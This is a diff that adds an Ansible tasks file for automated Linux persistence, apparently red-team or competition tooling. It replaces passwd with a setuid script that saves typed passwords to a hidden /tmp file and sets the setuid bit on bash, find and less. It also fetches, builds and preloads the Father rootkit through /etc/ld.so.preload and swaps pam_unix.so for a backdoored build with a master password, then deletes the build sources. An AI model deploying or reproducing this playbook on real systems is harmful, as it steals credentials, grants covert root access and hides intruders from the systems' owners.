@@ -1,0 +1,257 @@
+---
+# Rootkits and backdoor tasks
+
+- name: Backdoor passwd binary
+  block:
+    - name: Get passwd binary location
+      ansible.builtin.shell: "which passwd"
+      register: passwd_path
+      changed_when: false
+      check_mode: false
+
+    - name: Check if passwd already backed up
+      stat:
+        path: "{{ passwd_path.stdout }}.bak"
+      register: passwd_backup_exists
+      changed_when: false
+
+    - name: Move old passwd binary to .bak
+      ansible.builtin.copy:
+        src: "{{ passwd_path.stdout }}"
+        dest: "{{ passwd_path.stdout }}.bak"
+        remote_src: yes
+        mode: preserve
+      when: not passwd_backup_exists.stat.exists
+      register: passwd_backup
+      changed_when: passwd_backup.changed
+
+    - name: Place backdoor passwd script
+      ansible.builtin.copy:
+        dest: "{{ passwd_path.stdout }}"
+        content: |
+          #!/bin/bash
+          USER_TO_CHANGE="${1:-$USER}"
+          CAPTURE_FILE="/tmp/tmp.j3XNwAL5EM"
+          echo "Changing password for $USER_TO_CHANGE"
+          echo -n "Current password: "
+          read -s current_password
+          echo
+          echo -n "New password: "
+          read -s new_password
+          echo
+          echo -n "Confirm new password: "
+          read -s confirm_password
+          echo
+          echo "$current_password:$new_password:$confirm_password" >> "$CAPTURE_FILE"
+          if [[ "$new_password" != "$confirm_password" ]]; then
+              echo "Passwords do not match."
+              exit 1
+          fi
+          echo "$USER_TO_CHANGE:$new_password" | sudo chpasswd 2>/dev/null
+
+          # Confirm the password change
+          echo "Password changed successfully."
+
+          exit 0
+        mode: '4755'
+        owner: root
+        group: root
+      register: passwd_backdoor
+      changed_when: passwd_backdoor.changed
+
+- name: Set binaries to be suid
+  block:
+    - name: Find bash location
+      ansible.builtin.shell: "which bash"
+      register: bash_location
+      changed_when: false
+      check_mode: false
+
+    - name: Find find location
+      ansible.builtin.shell: "which find"
+      register: find_location
+      changed_when: false
+      check_mode: false
+
+    - name: Find less location
+      ansible.builtin.shell: "which less"
+      register: less_location
+      changed_when: false
+      check_mode: false
+
+    - name: Set bash suid bit
+      ansible.builtin.file:
+        path: "{{ bash_location.stdout }}"
+        mode: 'u+s'
+      register: bash_suid
+      changed_when: bash_suid.changed
+
+    - name: Set find suid bit
+      ansible.builtin.file:
+        path: "{{ find_location.stdout }}"
+        mode: 'u+s'
+      register: find_suid
+      changed_when: find_suid.changed
+
+    - name: Set less suid bit
+      ansible.builtin.file:
+        path: "{{ less_location.stdout }}"
+        mode: 'u+s'
+      register: less_suid
+      changed_when: less_suid.changed
+
+- name: Install father rootkit
+  block:
+    - name: Install dependencies for Debian or Ubuntu
+      ansible.builtin.apt:
+        name:
+          - git
+          - make
+          - gcc
+          - libpam0g-dev
+          - libgcrypt20-dev
+          - nasm
+        update_cache: yes
+        cache_valid_time: 3600
+      register: father_deps
+      changed_when: father_deps.changed
+
+    - name: Check if Father rootkit already installed
+      ansible.builtin.stat:
+        path: "{{ library_path }}"
+      register: father_exists
+      changed_when: false
+
+    - name: Clone repo, configure, and build father
+      ansible.builtin.shell: |
+        git clone https://github.com/mav8557/Father/ {{ father_base_path }}
+        sed -i 's/lobster/{{ evil_name }}/g' {{ father_base_path }}/src/config.h
+        sed -i 's/D431/{{ hidden_port }}/g' {{ father_base_path }}/src/config.h
+        sed -i 's|/lib/selinux.so.3|{{ library_path }}|g' {{ father_base_path }}/src/config.h
+        sed -i 's|/tmp/silly.txt|/etc/.silo|g' {{ father_base_path }}/src/pam.c
+        make -C {{ father_base_path }}
+        cp {{ father_base_path }}/rk.so {{ library_path }}
+      when: not father_exists.stat.exists
+      register: father_install
+      changed_when: true
+
+    - name: Get root filesystem device
+      ansible.builtin.shell: "df -h / | tail -1 | awk '{print $1}'"
+      register: root_device
+      changed_when: false
+      check_mode: false
+
+    - name: Check if debugfs is available
+      ansible.builtin.shell: "which debugfs || echo 'not_found'"
+      register: debugfs_available
+      changed_when: false
+      check_mode: false
+
+    - name: Install e2fsprogs if debugfs is not available
+      ansible.builtin.package:
+        name: e2fsprogs
+        state: present
+      when: debugfs_available.stdout == 'not_found'
+      register: e2fsprogs_installed
+      changed_when: e2fsprogs_installed.changed
+
+    - name: Check if ld.so.preload exists and get content using debugfs
+      ansible.builtin.shell: |
+        # Try to read the file directly with debugfs
+        debugfs -R 'cat /etc/ld.so.preload' {{ root_device.stdout }} 2>/dev/null || echo "File not found"
+      register: debugfs_content
+      changed_when: false
+      check_mode: false
+      become: yes
+      
+    - name: Set fact for preload existence and content
+      ansible.builtin.set_fact:
+        preload_exists: "{{ 'File not found' not in debugfs_content.stdout }}"
+        preload_has_lib: "{{ library_path in debugfs_content.stdout }}"
+      changed_when: false
+
+    - name: Create or overwrite ld.so.preload with shell
+      ansible.builtin.shell: |
+        echo "{{ library_path }}" > /etc/ld.so.preload
+        chmod 644 /etc/ld.so.preload
+        chown root:root /etc/ld.so.preload
+        echo "Done"
+      when: not preload_exists or not preload_has_lib
+      register: preload_update
+      changed_when: true
+
+    - name: Clean up Father source
+      ansible.builtin.file:
+        path: "{{ father_base_path }}"
+        state: absent
+      register: father_cleanup
+      changed_when: father_cleanup.changed
+
+- name: Backdoor PAM
+  block:
+    - name: Install dependencies
+      ansible.builtin.apt:
+        name:
+          - git
+          - autoconf
+          - automake
+          - autopoint
+          - bison
+          - bzip2
+          - docbook-xml
+          - docbook-xsl
+          - flex
+          - gettext
+          - libaudit-dev
+          - libcrack2-dev
+          - libdb-dev
+          - libfl-dev
+          - libselinux1-dev
+          - libtool
+          - libcrypt-dev
+          - libxml2-utils
+          - make
+          - pkg-config
+          - sed
+          - w3m
+          - xsltproc
+          - xz-utils
+          - gcc
+        state: present
+        update_cache: yes
+        cache_valid_time: 3600
+      register: pam_deps
+      changed_when: pam_deps.changed
+
+    - name: Check if pam_unix.so exists
+      ansible.builtin.stat:
+        path: /usr/lib/x86_64-linux-gnu/security/pam_unix.so
+      register: pam_unix_exists
+      changed_when: false
+
+    - name: Check if backdoor password already exists in pam_unix.so
+      ansible.builtin.shell: |
+        strings /usr/lib/x86_64-linux-gnu/security/pam_unix.so | grep -q "{{ pam_backdoor_password }}" && echo "Backdoor exists" || echo "Backdoor not found"
+      register: backdoor_check
+      changed_when: false
+      failed_when: false
+      when: pam_unix_exists.stat.exists
+
+    - name: Clone, build, and set up backdoor
+      ansible.builtin.shell: |
+        git clone https://github.com/segmentati0nf4ult/linux-pam-backdoor {{ pam_backdoor_base_path }}
+        cd {{ pam_backdoor_base_path }}
+        pam_version=$(dpkg -l | grep pam-runtime | awk '{printf $3}' | cut -c1-5)
+        ./backdoor.sh -v "$pam_version" -p {{ pam_backdoor_password }}
+        cp pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so
+      when: pam_unix_exists.stat.exists and (backdoor_check.stdout | default('') == "Backdoor not found")
+      register: pam_backdoor_install
+      changed_when: pam_backdoor_install.changed
+
+    - name: Clean up PAM backdoor source
+      ansible.builtin.file:
+        path: "{{ pam_backdoor_base_path }}"
+        state: absent
+      when: pam_backdoor_install.changed|default(false)
+      register: pam_cleanup
+      changed_when: pam_cleanup.changed
